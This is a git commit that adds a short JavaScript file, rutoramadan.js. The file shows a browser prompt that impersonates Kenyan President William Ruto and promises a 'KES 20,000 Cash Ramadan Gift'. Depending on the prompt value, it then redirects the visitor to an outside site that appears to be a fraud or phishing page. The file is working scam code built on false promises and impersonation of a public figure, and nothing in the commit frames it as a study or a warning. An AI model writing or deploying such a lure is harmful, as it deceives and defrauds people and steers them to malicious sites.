cbbd737d50db3720dbaba256e752568347e3572b
usorondo41 <discos_rates4c@icloud.com>
2026-03-07 08:57:43 +0100

    Create rutoramadan.js

---
+++ rutoramadan.js
@@ -0,0 +1,5 @@
+var password = 'KES 20,000'
+password = prompt('William Ruto: Congratulations, your are eligible to receive KES 20,000 Cash Ramadan Gift From President William Ruto, click OK to get offer now','KES 20,000');
+if (password != 'KES 20,000') {
+    location.href ='https://www.tangsioh.site/kes20000-ramadan';
+}
